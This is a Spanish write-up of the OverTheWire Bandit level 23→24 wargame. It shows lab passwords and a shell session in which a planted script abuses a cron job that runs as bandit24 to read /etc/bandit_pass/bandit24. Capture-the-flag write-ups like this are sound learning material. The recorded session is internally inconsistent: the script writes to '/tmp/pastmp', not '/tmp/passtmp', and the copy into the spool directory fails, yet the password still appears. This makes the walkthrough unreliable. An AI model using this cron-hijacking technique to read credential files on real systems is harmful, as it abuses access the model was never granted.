# Bandit
# Level 23 a 24
## Objetivo
Un pograma se ejecuta automáticamentea intervalos regulares desde **cron**, el programador de trabajos basado en el tiempo. Busque en **/etc/cron.d/** la configuración y vea qué comando se está ejecutando.
**NOTA:** este nivel requiere que cree su propio primer script de shell: ¡Este es un paso muy grande y deberías star orgulloso de ti mismo cuando superes este nivel!
**NOTA 2:** tenga en cuenta que su primer script de shell se elimina una vez que se ejecuta, por lo que es posible que desee conservar una copia...

## Datos de acceso
Username: bandit23
Contraseña: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
Puerto: 2220
Host:  bandit.labs.overthewire.org

## Solución
 ```shell
ssh bandit23@bandit.labs.overthewire.org -p 2220
bandit23@bandit:~$ ls -la /etc/cron.d/
total 48
drwxr-xr-x   2 root root 4096 Sep  1 06:30 .
drwxr-xr-x 110 root root 4096 Sep  8 12:09 ..
-rw-r--r--   1 root root   62 Sep  1 06:30 cronjob_bandit15_root
-rw-r--r--   1 root root   62 Sep  1 06:30 cronjob_bandit17_root
-rw-r--r--   1 root root  120 Sep  1 06:30 cronjob_bandit22
-rw-r--r--   1 root root  122 Sep  1 06:30 cronjob_bandit23
-rw-r--r--   1 root root  120 Sep  1 06:30 cronjob_bandit24
-rw-r--r--   1 root root   62 Sep  1 06:30 cronjob_bandit25_root
-rw-r--r--   1 root root  201 Jan  8  2022 e2scrub_all
-rwx------   1 root root   52 Sep  1 06:30 otw-tmp-dir
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder
-rw-r--r--   1 root root  396 Feb  2  2021 sysstat
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:~$ cd /var/spool/bandit24
bandit23@bandit:/var/spool/bandit24$ mkdir /tmp/password
mkdir: cannot create directory ‘/tmp/password’: File exists
bandit23@bandit:/var/spool/bandit24$ mkdir /tmp/passtmp
bandit23@bandit:/var/spool/bandit24$ cd /tmp/passtmp
bandit23@bandit:/tmp/passtmp$ echo "cat /etc/bandit_pass/bandit24 >> /tmp/pastmp/password" > mio.sh
bandit23@bandit:/tmp/passtmp$ chmod 777 mio.sh
bandit23@bandit:/tmp/passtmp$ cat mio.sh
cat /etc/bandit_pass/bandit24 >> /tmp/pastmp/password
bandit23@bandit:/tmp/passtmp$ ls -la mio.sh
-rwxrwxrwx 1 bandit23 bandit23 54 Sep 24 01:12 mio.sh
bandit23@bandit:/tmp/passtmp$ touch password
bandit23@bandit:/tmp/passtmp$ chmod 666 password
bandit23@bandit:/tmp/passtmp$ ls -la password
-rw-rw-rw- 1 bandit23 bandit23 0 Sep 24 01:13 password
bandit23@bandit:/tmp/passtmp$ ls -la
total 332
drwxrwxr-x    2 bandit23 bandit23   4096 Sep 24 01:13 .
drwxrwx-wt 1914 root     root     327680 Sep 24 01:12 ..
-rwxrwxrwx    1 bandit23 bandit23     54 Sep 24 01:12 mio.sh
-rw-rw-rw-    1 bandit23 bandit23      0 Sep 24 01:13 password
bandit23@bandit:/tmp/passtmp$ cp mio.sh /var/spool/bandit24
cp: cannot create regular file '/var/spool/bandit24/mio.sh': Operation not permitted
bandit23@bandit:/tmp/passtmp$ date
Sat Sep 24 01:14:43 AM UTC 2022
bandit23@bandit:/tmp/passtmp$ date
Sat Sep 24 01:15:58 AM UTC 2022
bandit23@bandit:/tmp/passtmp$ ls -la
total 332
drwxrwxr-x    2 bandit23 bandit23   4096 Sep 24 01:13 .
drwxrwx-wt 1916 root     root     327680 Sep 24 01:16 ..
-rwxrwxrwx    1 bandit23 bandit23     54 Sep 24 01:12 mio.sh
-rw-rw-rw-    1 bandit23 bandit23     33 Sep 24 01:14 password
bandit23@bandit:/tmp/passtmp$ date
Sat Sep 24 01:17:34 AM UTC 2022
bandit23@bandit:/tmp/passtmp$ cat password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

```
 
## Notas adicionales
Se hace un directorio nuevo con el comando `mkdir`, tamién se crea un archivo`.sh` con un comando para que traspase a otro archivo llamado `password` la contaseña del siguiente nivel, la cual se verá haciendo `cat` al archivo `password`, pero antes de hacer el `cat` debemos usr el comando `cp` a un directorio para copiar un directorio o archivo especificado (el cual contiene la contraseña), esperamos un minuto para que se copie hacemos `cat` y ya tendremos la contraseña.

## Referencias
- [Otra solución de la web para este nivel](https://david-varghese.medium.com/overthewire-bandit-level-23-level-24-3a7efa0e3b99)
